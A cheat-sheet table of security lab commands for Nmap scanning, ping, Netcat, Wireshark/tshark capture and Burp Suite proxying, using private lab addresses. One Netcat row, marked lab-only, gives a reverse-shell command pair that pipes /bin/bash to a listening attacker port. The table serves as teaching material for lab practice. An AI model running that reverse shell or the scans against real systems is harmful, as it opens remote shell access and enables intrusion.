| Tool      | Command                                    | Purpose                                                              | Example                                 |
|-----------|--------------------------------------------|----------------------------------------------------------------------|-----------------------------------------|
| Nmap      | `nmap [IP]`                                | Basic scan: checks ≈1000 common TCP ports.                           | `nmap 192.168.56.101`                   |
| Nmap      | `nmap -sV [IP]`                            | Service version detection on open ports.                             | `nmap -sV 192.168.56.101`               |
| Nmap      | `nmap -A [IP]`                             | Aggressive scan: OS detection, version detection, scripts, traceroute.| `nmap -A 192.168.56.101`                |
| Ping      | `ping [IP]`                                | Network connectivity test (sends ICMP packets).                      | `ping 192.168.56.101`                   |
| Netcat    | `nc -lvp [PORT]`                           | Listener: open a TCP port, verbose, keep listening.                  | `nc -lvp 4444`                          |
| Netcat    | `nc [IP] [PORT]`                           | Connect to a remote port (simple client).                            | `nc 192.168.56.102 4444`                |
| Netcat    | `nc -v -z [IP] [PORT-RANGE]`               | Port scan (TCP connect checks, without sending data).                | `nc -v -z 192.168.56.102 1-1000`        |
| Netcat    | `tput: Reverse shell (lab use ONLY)`       | Create an interactive shell back to attacker — **lab-only**.         | Attacker: `nc -lvp 4444` <br> Target: `nc 192.168.56.101 4444 -e /bin/bash` |
| Wireshark | `wireshark` (GUI)                          | Start GUI packet capture and analysis.                               | Open Wireshark → choose interface → Start Capture |
| Wireshark | `tshark -i [iface] -w file.pcap -c [n]`    | CLI capture to file (`tshark` is Wireshark CLI).                     | `tshark -i eth0 -w capture.pcap -c 100` |
| Burp Suite| Start Burp (GUI) + set browser proxy `127.0.0.1:8080` | Intercept and modify HTTP(S) traffic via local proxy.                | Open Burp → Proxy → Options → set listener 127.0.0.1:8080; set browser proxy |
